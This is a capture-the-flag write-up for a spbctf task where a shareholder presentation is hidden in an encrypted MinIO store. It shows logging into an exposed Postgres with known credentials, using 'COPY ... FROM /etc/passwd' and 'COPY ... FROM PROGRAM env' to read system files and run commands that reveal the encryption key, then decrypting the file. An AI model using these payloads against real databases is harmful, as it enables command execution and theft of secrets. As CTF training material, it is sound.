# Ошибка на миллиард
## Task

[Task link](http://t-s3curestorage-ltrznwe1.spbctf.net/)


Через полчаса квартальный отчет перед акционерами компании. И кто-то по ошибке перекинул презентацию топ-менеджера в неизвестную часть файлохранилища, а ему отправил инструкцию по пожарной безопасности.

Найдите презу, асап!

Файлохранилище: t-s3curestorage-ltrznwe1.spbctf.net/

## Solution

Find opened `9000` port on http://t-s3curestorage-ltrznwe1.spbctf.net.

Find there encrypted files and [app.py](app.py)

So we can decrypt file if we find `APP_ENCRYPTION_KEY` environment.

Find opened postgres, so we already know database credentials, let's connect to it.

```python
conn = psycopg2.connect(
        host="127.0.0.1",
        database="s3curestorage",
        user="s3curestorage",
        password="<masked>")
```

So try to find environments with postgres.
Create table where we will read files.
```sql
create table environments(data text);
```

Load environment variables to this table.

```sql
copy environments(data) from '/etc/passwd';
copy environments from program 'env';
select * from environments;
```

So now we can decrypt arbitraty file from minio.

Get the file we interested in
```bash
$ curl -LO http://t-s3curestorage-ltrznwe1.spbctf.net:9000/s3curestorage/b349b65d-3f7d-4c80-9f75-7347979423cb
```
Also get metadata from headers
```bash
$ curl -i http://t-s3curestorage-ltrznwe1.spbctf.net:9000/s3curestorage/b349b65d-3f7d-4c80-9f75-7347979423cb

HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 162190
Content-Type: application/octet-stream
ETag: "c2e75b583a5dd3640af696a95efdcab7"
Last-Modified: Mon, 15 Apr 2024 23:19:43 GMT
Server: MinIO
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Origin
Vary: Accept-Encoding
X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
X-Amz-Request-Id: 17C8B46351A45BD2
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
x-amz-meta-nonce: wEsEET5P6ULcQGwthElKew==
x-amz-meta-tag: 7Rr900b5TBqcoKj2CsMy4Q==
Date: Mon, 22 Apr 2024 20:33:16 GMT
```

We interested in `x-amz-meta-nonce` and `x-amz-meta-tag`

Decrypt the file

```python
from Crypto.Cipher import AES
import base64

def decrypt_file(nonce, tag, ciphertext, key):
    cipher = AES.new(key, AES.MODE_EAX, nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)

    return plaintext

nonce = base64.b64decode('wEsEET5P6ULcQGwthElKew==')
tag = base64.b64decode('7Rr900b5TBqcoKj2CsMy4Q==')
APP_ENCRYPTION_KEY='<masked>'
key = APP_ENCRYPTION_KEY.encode()

decrypted_data = decrypt_file(nonce, tag, open('b349b65d-3f7d-4c80-9f75-7347979423cb', 'rb').read(), key)
open('decripted', 'wb').write(decrypted_data)
```

Get the type of the file

```bash
$ file decripted
decripted: Microsoft PowerPoint 2007+
```

I didn't managed to open it on macos, so I unpacked it and grepped.
```bash
$ mv decripted decripted.zip
```

Unpack it
```bash
$ unzip decripted.zip
```

Find the flag in images or just in text.
```bash
$ grep -R tctf .
./ppt/slides/slide2.xml: <trash>tctf{lol_so_secure_much_encrypted}<trash>
```
